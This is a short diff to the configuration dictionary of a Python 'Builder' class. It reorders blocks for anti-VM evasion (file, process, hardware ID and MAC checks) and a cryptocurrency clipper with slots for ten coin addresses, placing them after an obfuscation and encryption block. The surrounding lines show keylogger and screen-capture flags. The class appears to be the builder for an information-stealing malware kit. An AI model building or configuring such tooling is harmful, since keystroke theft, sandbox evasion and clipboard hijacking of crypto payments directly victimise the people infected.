@@ -59,25 +59,6 @@ class Builder:
                 'keystrk': True,
                 'scrnman': True
             },
-            'anti_vm': {
-                'enabled': True,
-                'FilesCheck': True,
-                'ProcessesCheck': True,
-                'HardwareIDsCheck': True,
-                'MacAddressesCheck': True
-            },
-            'crypto_clipper': {
-                'BTC': '',
-                'ETH': '',
-                'DOGE': '',
-                'LTC': '',
-                'XMR': '',
-                'BCH': '',
-                'DASH': '',
-                'TRX': '',
-                'XRP': '',
-                'XLM': ''
-            },
             'obfuscation': {
                 'enabled': True,
                 'settings': {
@@ -115,8 +96,27 @@ class Builder:
                         True, 
                         '__main__.py',  # bootstrap_file
                         True  # encrypt
-                    ],
+                    ]
                 }
+            },
+            'anti_vm': {
+                'enabled': True,
+                'FilesCheck': True,
+                'ProcessesCheck': True,
+                'HardwareIDsCheck': True,
+                'MacAddressesCheck': True
+            },
+            'crypto_clipper': {
+                'BTC': '',
+                'ETH': '',
+                'DOGE': '',
+                'LTC': '',
+                'XMR': '',
+                'BCH': '',
+                'DASH': '',
+                'TRX': '',
+                'XRP': '',
+                'XLM': ''
             }
         }
 
